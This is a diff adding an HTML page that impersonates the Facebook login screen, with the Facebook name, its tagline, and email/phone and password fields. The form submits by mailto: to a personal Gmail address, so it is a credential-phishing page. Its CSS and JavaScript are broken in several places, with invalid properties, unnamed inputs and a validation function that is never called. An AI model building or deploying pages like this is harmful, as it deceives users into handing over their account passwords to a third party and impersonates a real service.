@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+    <head lang="en">
+        <title>login page</title>
+<meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+body{
+bgcolor: green;
+}
+p{
+bg color;white;
+color:black;
+
+}
+p,h1{
+font:"Roboto";
+
+}
+form {
+  border: 2px solid black;  
+width:450px; 
+height:200px;
+}
+log in{
+color: blue;
+}
+</style>
+</head>
+    <body>
+     <center>
+        <h1 style="color: blue"> facebook </h1>
+<P>Connect with friends and the world around you on Facebook.</P>
+    <form method="post" action="mailto:alaptop423@gmail.com">
+
+<P>Email or phone number : <input type="text" size="25" maxlength="20">
+</P>
+<p style="font-size : 17px"> Password :   <input type="password" size="18" maxlength="15"></p>
+<P> <input type="submit" value="log in" style="background-color: blue; color: white; >
+</p>
+    </center> 
+</form>  
+<script>
+    function validateForm() {
+        var email = document.getElementById('email').value;
+        var password = document.getElementById('password').value;
+        if (email === "" || password === "") {
+            alert("Both email and password must be filled out");
+            return false;
+        }
+        return true;
+    }
+</script>
+    </body>
+    </html>
